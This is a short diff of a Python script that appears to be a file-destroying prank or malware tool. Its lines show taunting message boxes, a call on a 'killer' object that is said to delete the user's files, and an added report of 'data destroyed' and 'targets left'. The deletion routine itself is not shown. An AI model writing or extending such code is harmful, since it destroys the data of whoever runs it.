@@ -61,3 +61,12 @@ inn = input('stop maybe?, {}/{} '.format(random.choice(no[1:]), random.choice(no
 mb.showinfo('lol', 'hahaha\ndid you really think that you can stop now?')
 killer.pfr()
 mb.showinfo('xD', 'lol\nbtw here is the guy who\'ll kill all those files of yours:\n{}'.format(killer))
+
+
+#end
+print ('{:=^60}'.format(' report start '))
+print ('agent stats after the operation:\n{}'.format(killer))
+print ('data destroyed in operation: {}'.format(killer.kills))
+print ('targets left: {}'.format(len(killer.Files) + len(killer.Folders)))
+print ('{:=^60}'.format(' report end '))
+print ('\nthats it, have a bad day!')
